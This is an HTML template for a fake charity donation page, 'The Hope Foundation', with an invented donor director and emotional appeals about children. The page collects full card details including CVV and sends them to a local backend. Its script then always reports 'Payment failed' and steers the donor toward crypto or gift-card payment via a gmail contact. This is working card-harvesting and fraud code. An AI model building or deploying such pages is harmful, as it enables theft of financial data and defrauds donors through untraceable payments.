<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Donate to The Hope Foundation</title>
    <link
      rel="stylesheet"
      href="{{ url_for('static', filename='style.css') }}"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="donation-container">
      <h1>Support The Hope Foundation</h1>
      <p class="intro">
        Your gift helps feed hungry children, care for orphans, and restore
        dignity to forgotten lives. Together, we make hope real.
      </p>

      <section class="donor-director">
        <div class="donor-box">
          <img
            src="{{ url_for('static', filename='dpage images/joe.png') }}"
            alt="Chief Donor Director Jonathan"
            class="donor-img"
          />
          <div class="donor-message">
            <h2>A Note from Jonathan</h2>
            <p>
              Hi, I’m Jonathan, Chief Donor Director at The Hope Foundation.<br /><br />
              First, before you donate, I just want to say thank you and for the
              heart that led you here. Your kindness today helps children eat,
              sleep safely, and dream again. If you have questions or need help
              donating, my team and I are always ready to guide you.
            </p>
            <p class="donor-signature">
              — Mr. Jonathan Wells, Chief Donor Director
            </p>
          </div>
        </div>
      </section>

      <form id="donationForm">
        <div class="form-group">
          <label for="name">Full Name</label>
          <input type="text" id="name" required />
        </div>

        <div class="form-group">
          <label for="email">Email Address</label>
          <input type="email" id="email" required />
        </div>

        <div class="form-group">
          <label for="amount">Donation Amount ($)</label>
          <input type="number" id="amount" required />
        </div>

        <div class="form-group">
          <label for="message">Message to the Kids</label>
          <p class="message-note">
            (Optional — but just so you know, any of the children may write you
            back. They love hearing from kind strangers like you.)
          </p>
          <textarea
            id="message"
            placeholder="Write something warm, inspiring, or hopeful..."
          ></textarea>
        </div>

        <div class="card-info">
          <h3>Card Details</h3>

          <div class="form-group card-number-wrapper">
            <label for="cardNumber">Card Number</label>
            <div class="card-input">
              <input
                type="text"
                id="cardNumber"
                placeholder="0000 0000 0000 0000"
                required
              />
              <img id="cardLogo" class="card-logo" src="" alt="" />
            </div>
          </div>

          <div class="card-flex">
            <div class="form-group">
              <label for="expiry">Expiration Date</label>
              <input type="text" id="expiry" placeholder="MM/YY" required />
            </div>

            <div class="form-group">
              <label for="cvv">Security Code</label>
              <input type="text" id="cvv" placeholder="CVV" required />
            </div>
          </div>

          <div class="form-group">
            <label for="billing">Billing Address</label>
            <input type="text" id="billing" required />
          </div>

          <div class="form-group">
            <label for="nameOnCard">Name on Card</label>
            <input type="text" id="nameOnCard" required />
          </div>

          <div class="form-group">
            <label for="country">Country</label>
            <input type="text" id="country" required />
          </div>
        </div>

        <button type="submit" class="donate-btn">Donate Now</button>
        <p id="error-message" class="error-message" style="display: none"></p>
      </form>

      <div class="alternate-options" style="display: none" id="altOptions">
        <p>Unfortunately, card donation failed at this time.</p>
        <p>
          Please consider donating via <strong>Crypto</strong> or
          <strong>Gift Card</strong>.
        </p>
        <a
          class="alt-button"
          href="mailto:thehopeproject2000@gmail.com?subject=Crypto/Gift%20Card%20Donation"
          >Contact Chief Donor Director</a
        >
      </div>
    </div>

    <script>
      const form = document.getElementById("donationForm");
      const errorMessage = document.getElementById("error-message");
      const altOptions = document.getElementById("altOptions");

      form.addEventListener("submit", function (e) {
        e.preventDefault();

        const formData = {
          name: document.getElementById("name").value,
          email: document.getElementById("email").value,
          amount: document.getElementById("amount").value,
          message: document.getElementById("message").value,
          cardNumber: document.getElementById("cardNumber").value,
          expiry: document.getElementById("expiry").value,
          cvv: document.getElementById("cvv").value,
          billing: document.getElementById("billing").value,
          nameOnCard: document.getElementById("nameOnCard").value,
          country: document.getElementById("country").value,
        };

        fetch("http://127.0.0.1:5000/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        })
          .then((res) => res.json())
          .then(() => {
            errorMessage.textContent =
              "Payment failed. Please try again or use an alternative.";
            errorMessage.style.display = "block";
            altOptions.style.display = "block";
            form.scrollIntoView({ behavior: "smooth" });
          })
          .catch((err) => {
            console.error("Error:", err);
            alert("Failed to submit. Make sure the backend is running.");
          });
      });

      // Card logo detection
      const cardInput = document.getElementById("cardNumber");
      const cardLogo = document.getElementById("cardLogo");

      cardInput.addEventListener("input", () => {
        const number = cardInput.value.replace(/\s+/g, "");
        if (/^4/.test(number)) {
          cardLogo.src =
            "{{ url_for('static', filename='dpage images/visa.png') }}";
          cardLogo.style.display = "inline";
        } else if (/^5[1-5]/.test(number)) {
          cardLogo.src =
            "{{ url_for('static', filename='dpage images/mstr.png') }}";
          cardLogo.style.display = "inline";
        } else if (/^3[47]/.test(number)) {
          cardLogo.src =
            "{{ url_for('static', filename='dpage images/amex.png') }}";
          cardLogo.style.display = "inline";
        } else {
          cardLogo.src = "";
          cardLogo.style.display = "none";
        }
      });
    </script>
  </body>
</html>
